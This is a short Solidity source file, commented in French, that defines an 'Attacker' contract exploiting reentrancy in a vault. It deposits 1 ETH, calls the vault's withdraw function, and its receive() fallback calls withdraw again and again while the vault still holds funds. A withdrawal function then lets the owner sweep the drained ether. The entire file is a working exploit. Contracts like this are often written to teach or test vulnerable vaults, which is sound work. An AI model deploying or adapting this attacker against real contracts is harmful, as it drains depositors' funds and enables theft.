// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./IVault.sol";

contract Attacker {
    IVault public immutable vault;
    address public immutable owner;

    uint256 public reentrances;
    bool private attaqueEnCours;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attaquer() external payable {
        require(msg.value == 1 ether, "1 ETH requis");
        attaqueEnCours = true;
        vault.deposer{value: 1 ether}();
        vault.retirer();
        attaqueEnCours = false;
    }

    receive() external payable {
        if (attaqueEnCours && address(vault).balance >= 1 ether) {
            reentrances++;
            vault.retirer();
        }
    }

    function retirerFonds() external {
        require(msg.sender == owner, "pas le proprietaire");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "retrait echoue");
    }
}
